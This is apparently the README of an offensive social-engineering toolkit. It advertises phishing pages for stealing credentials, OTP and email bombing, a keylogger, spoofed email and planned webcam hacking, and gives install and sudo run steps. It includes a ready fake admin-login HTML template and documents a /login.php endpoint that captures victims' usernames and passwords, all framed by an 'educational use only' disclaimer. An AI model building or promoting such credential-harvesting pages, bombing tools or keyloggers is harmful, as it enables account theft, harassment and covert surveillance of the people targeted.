

# SOCIAL ENGINEER 🎯🕵️‍♂️

A powerful social engineering toolkit that automates phishing, OTP/email bombing, fake mail, and more — built with ❤️ by [@karthithehacker](https://karthithehacker.com)

![Main Menu](https://raw.githubusercontent.com/karthi-the-hacker/SocialEngineer/refs/heads/main/images/social-engineer.png)

> ⚠️ For educational use only. Do **not** use this tool against anyone without explicit permission.

---

## 📌 Features

* 🎯 **Phishing Attacks** – Simulate fake login pages to steal credentials
* 🔢 **OTP Bombing** – Flood OTP requests to a target number
* 🎹 **Keylogger** – Capture user keystrokes
* 📧 **Email Bombing** – Mass email sending to disrupt inboxes
* ✉️ **Send Fake Email** – Custom spoofed email sender
* ❌ **Quit** – Exit the toolkit gracefully

---

## 💻 Tech Stack

* **Language**: Python 3
* **Libraries Used**:

  * `requests`
  * `rich`
  * `colorama`
  * `dnspython`

Install them with:

```bash
pip install -r requirements.txt
```

---

## 🗂️ Project Structure

```
Social-Engineer/
├── AttackModes/
│   ├── phishing.py
│   ├── keylogger.py
│   ├── otpboming.py
│   ├── spfattack.py
│   └── emailboming.py
├── includes/
│   ├── banner.py
│   ├── config_status.py
│   ├── dynamic_url.py
│   ├── menu.py
│   └── utils.py
├── SocialEngineer.py
├── requirements.txt
└── README.md
```

---

## 🚀 Usage

### 🔧 Installation

1. Clone the repository:

```bash
git clone https://github.com/karthi-the-hacker/SocialEngineer.git
cd SocialEngineer
```

2. Install dependencies:

```bash
pip install -r requirements.txt
```

3. Run the tool:

```bash
sudo python3 SocialEngineer.py
```

### 📸 Sample Output

```text

                                                                                                    v1.0

███████╗ ██████╗  ██████╗██╗ █████╗ ██╗         ███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗███████╗██████╗ 
██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║         ██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║███████║██║         █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  █████╗  ██████╔╝
╚════██║██║   ██║██║     ██║██╔══██║██║         ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██╗
███████║╚██████╔╝╚██████╗██║██║  ██║███████╗    ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝                                           
                                                                Author: @karthithehacker
                                                                Website: Karthithehacker.com                                                               
                                                     

            Main Menu             
┏━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ No. ┃ Option                   ┃
┡━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 1   │ 🎯 Start Phishing Attack │
│ 2   │ 📲 OTP Bombing           │
│ 3   │ 🎹 Keylogger             │
│ 4   │ 📩 Email Bombing         │
│ 5   │ 📧 Send Fake Email       │
│ 0   │ ❌ Quit                  │
└─────┴──────────────────────────┘

👉 Select an option: 
```


## 📝 Notes

- You can keep adding new folder templates in `templates/` with the structure:
  ```
  templates/
  ├── yourtemplatename/
      ├── index.html
      └── index.css
  ```
- The server will load the correct template based on the user input or default config.
- Make sure your Python server is serving files from the selected template directory and captures data from `/login`.




## 🧪 Example Fake Login Template (HTML)

### `index.html`

```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>XYZ Admin Login</title>
      <link rel="stylesheet" href="index.css">
    </head>
    <body>
      <form action="/login.php" method="post" class="login-box">
        <h2>Login</h2>
        <input type="text" name="email" placeholder="Username or Email" required>
        <input type="hidden" name="type" value="xyz"></input>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
        <div class="note">fake template</div>
      </form>
    </body>
    </html>
```


## 📡 Phishing Portal Endpoint

The `login.php` endpoint receives credentials from fake  login pages (templates). When a user submits the login form, the server captures the following parameters:

### 📥 POST `/login.php`

| Parameter  | Type     | Description            |
|------------|----------|------------------------|
| `email` | `string` | **Required.** Username or email entered by the user |
| `password` | `string` | **Required.** Password entered by the user |
| `type` | `string` | **Required.** Template name set by developer |


---

## 🔮 Planned Features

> Coming Soon:

* 📞 Fake IVR Call
* 🛠️  Settings / Configuration Menu
* 🎥 Webcam Hacking

---

## 👨‍💻 Author

* Website: [karthithehacker.com](https://karthithehacker.com)
* GitHub: [@karthi-the-hacker](https://github.com/karthi-the-hacker)

---

## ⚠️ Disclaimer

This tool is intended **strictly for educational and ethical use**.
Do not use it to attack targets without prior consent.
The developer takes **no responsibility** for any misuse or illegal activity.

